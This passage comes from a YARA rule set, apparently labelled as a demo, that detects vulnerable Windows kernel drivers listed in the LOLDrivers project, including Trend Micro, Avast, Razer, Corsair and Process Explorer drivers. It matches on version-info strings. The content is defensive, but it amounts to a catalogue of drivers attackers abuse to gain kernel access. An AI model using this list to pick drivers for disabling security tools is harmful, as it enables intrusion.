filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Adlicesoftware_Truesight_Truesight_BFC2_RID3C0A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - truesight.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:54:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0052006f006700750065004b0069006c006c0065007200200041006e007400690072006f006f0074006b006900740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410064006c00690063006500200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005400720075006500730069006700680074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720075006500730069006700680074 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005400720075006500730069006700680074 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000410064006c00690063006500200053006f00660074007700610072006500280043002900200032003000320033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_87B4_RID4214 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:12:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300035002e00340037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300035002e00340037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Highresolutionenterpriseswwwhighrezcouk_Inpoutxsys_Inpoutxdriverversion_X_F581_RID4CEC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - inpoutx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:55:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b00650072006e0065006c0020006c006500760065006c00200070006f0072007400200061006300630065007300730020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0048006900670068007200650073006f006c007500740069006f006e00200045006e0074006500720070007200690073006500730020005b007700770077002e006800690067006800720065007a002e0063006f002e0075006b005d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003200200078003600340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00320020007800360034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0069006e0070006f00750074007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0069006e0070006f007500740078003600340020004400720069007600650072002000560065007200730069006f006e00200031002e0032 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0069006e0070006f00750074007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300030003800200048006900670068007200650073006f006c007500740069006f006e00200045006e007400650072007000720069007300650073002e00200050006f007200740069006f006e007300200043006f007000790072006900670068007400200028006300290020004c006f00670069007800340075 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_12ED_RID3DB8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:06:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100320031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_FF1C_RID3D6A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:53:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f00330032002f003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e003600300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e00360030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f00330032002f003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100310020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_EBE2_RID3EDE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:55:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0032002e0034003100350037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0032002e0034003100350037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtierforwindows_V_CA34_RID3BBB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:41:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00760032002e003000200028003200300030003600300038003000380029 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c00200058005400690065007200200066006f0072002000570069006e0064006f00770073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200031003900390037002d00320030003000370020004e006f00760065006c006c002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_46D1_RID3629 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:44:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003200300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003200300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310038002e002000520061007a00650072002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Corsairmemoryinc_Corsairllaccess_Corsairllaccess_A334_RID419D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CorsairLLAccess64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:52:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e002000280063002900200032003000310039002c00200041006c006c0020007200690067006800740073002000720065007300650072007600650064 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_1C12_RID3DA3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:03:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00350030002e0030002e0031003100320034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroaegis_4BC0_RID3E08 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:19:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e00320030002e0030002e0031003000310032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e00320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f002000410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003100300020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Iobitinformationtechnology_Iobitunlockersys_Unlocker_F85C_RID43AD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iobitunlocker.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:20:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0055006e006c006f0063006b006500720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049004f00620069007400200049006e0066006f0072006d006100740069006f006e00200054006500630068006e006f006c006f00670079 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0030002e00310030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0030002e00310030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0055006e006c006f0063006b00650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200049004f006200690074002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtierforwindows_V_C190_RID3BAD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:39:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0035002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00760033002e0031002e003500200028003200300030003600300038003200380029 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c00200058005400690065007200200066006f0072002000570069006e0064006f00770073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200031003900390037002d00320030003000370020004e006f00760065006c006c002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_9B6A_RID4646 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:11:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310036002e00320037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310036002e00320037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_7D43_RID466B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:17:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310037002e0039002e0033003700360031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310037002e0039002e0033003700360031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310034002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_7337_RID3C6C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:11:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e003200300037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e003200300037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Aegis_ADC1_RID39E1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:22:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0031003000310036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000380020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Sbiosiosys_Samsungrbiosiodriver_1E24_RID449F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SBIOSIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:01:01\"\n      score = 40\n      customer = \"demo\"\n      license = 